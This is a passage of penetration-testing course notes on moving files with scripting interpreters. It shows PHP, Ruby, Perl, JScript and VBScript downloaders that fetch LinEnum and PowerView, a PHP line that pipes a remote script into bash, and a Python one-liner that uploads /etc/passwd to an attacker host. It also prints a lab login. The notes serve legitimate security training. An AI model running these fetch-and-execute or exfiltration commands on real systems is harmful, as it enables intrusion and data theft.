# fetch and pipe straight to bash (fileless)
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

| Piece | What it does |
|-------|----------------|
| `php -r '...'` | Run inline PHP |
| `file_get_contents` / `file_put_contents` | Read URL into memory, write to file |
| `fopen("...","rb")` + `fread`/`fwrite` | Stream remote → local in 1 KB chunks |
| `@file(URL)` + `\| bash` | Read URL as lines, echo, pipe to shell (no file saved) |

**Note:** `@file(URL)` works only if PHP `fopen` URL wrappers are enabled.

### Ruby & Perl

**What this is:** One-liners via `-e`.

**When to use:** Ruby/Perl present but Python/PHP aren't.

```bash
# Ruby
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'

# Perl
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

| Piece | What it does |
|-------|----------------|
| `ruby -e` / `perl -e` | Run inline program |
| `Net::HTTP.get` + `File.write` | Ruby: fetch URL, write file |
| `LWP::Simple getstore` | Perl: fetch URL → save file |

### JavaScript (Windows, cscript)

**What this is:** A `wget.js` script using `WinHttpRequest` + `ADODB.Stream`, run with `cscript.exe`.

**When to use:** Windows target without PowerShell web access; living off `cscript`.

```javascript
// wget.js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

```cmd
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

| Piece | What it does |
|-------|----------------|
| `WinHttpRequest` | Performs the HTTP GET (arg 0 = URL) |
| `ADODB.Stream` (Type 1 = binary) | Buffers response bytes and saves to arg 1 |
| `cscript /nologo wget.js URL OUT` | Runs the script: download URL → OUT file |

### VBScript (Windows, cscript)

**What this is:** Same idea as the JS version using `MSXML2.XMLHTTP` + `ADODB.Stream`. VBScript ships on every Windows desktop since 98.

```vbscript
' wget.vbs
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

```cmd
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

| Piece | What it does |
|-------|----------------|
| `Microsoft.XMLHTTP` | HTTP GET (arg 0 = URL) |
| `ADODB.Stream .savetofile ...,2` | Save bytes to arg 1 (`2` = overwrite) |

---

## Upload with code (Python3)

**What this is:** Python's `requests` module POSTs a file to the Python `uploadserver` `/upload` endpoint.

**When to use:** Pull loot off a box that has Python 3 + `requests`.

**Pwnbox — start upload server**

```bash
python3 -m uploadserver
# File upload available at /upload — serves on :8000
```

**Target — upload one-liner**

```bash
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

Expanded so each piece is clear:

```python
import requests                                  # HTTP client module
URL = "http://192.168.49.128:8000/upload"        # upload endpoint
file = open("/etc/passwd", "rb")                 # open the file (binary)
r = requests.post(URL, files={"files": file})    # POST it as multipart upload
```

| Piece | What it does |
|-------|----------------|
| `requests.post(url, files=...)` | Sends a multipart POST (a file upload) |
| `open(path, "rb")` | Reads the file as binary to attach |
| `uploadserver` | Receives it at `/upload` and writes to disk |

---

## Quick cheat sheet (code)

| Language | Download one-liner | Notes |
|----------|--------------------|-------|
| Python 3 | `python3 -c 'import urllib.request;urllib.request.urlretrieve(URL,OUT)'` | py2 uses `urllib.urlretrieve` |
| PHP | `php -r 'file_put_contents(OUT,file_get_contents(URL));'` | `... \| bash` for fileless |
| Ruby | `ruby -e 'require"net/http";File.write(OUT,Net::HTTP.get(URI(URL)))'` | |
| Perl | `perl -e 'use LWP::Simple;getstore(URL,OUT);'` | |
| JScript | `cscript /nologo wget.js URL OUT` | Windows LoLBin |
| VBScript | `cscript /nologo wget.vbs URL OUT` | Windows LoLBin |
| Python 3 (upload) | `python3 -c 'import requests;requests.post(URL,files={"files":open(F,"rb")})'` | to `uploadserver` |

---

## Academy (Section 4)

### Optional Exercise 1

SSH in (`htb-student` / `HTB_@cademy_stdnt!`) and practice these code-based upload/download one-liners with your attack host, then submit: `DONE`.

```bash
ssh htb-student@TARGET
# then try, e.g.:
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://PWNBOX:8000/flag.txt","flag.txt")'
```

---

## Recap (code)

| Method | One-line description |
|--------|----------------------|
| Python `-c` | `urlretrieve` download; `requests.post` upload |
| PHP `-r` | `file_get_contents`/`fopen` download, or pipe to `bash` |
| Ruby/Perl `-e` | `Net::HTTP`/`LWP::Simple` downloads |
| JScript/VBScript + `cscript` | Windows LoLBin downloaders via `WinHttp`/`XMLHTTP` + `ADODB.Stream` |
| Python `requests` | Code-driven multipart upload to `uploadserver` |

Interpreters double as file-transfer tools — handy when the usual utilities are stripped.
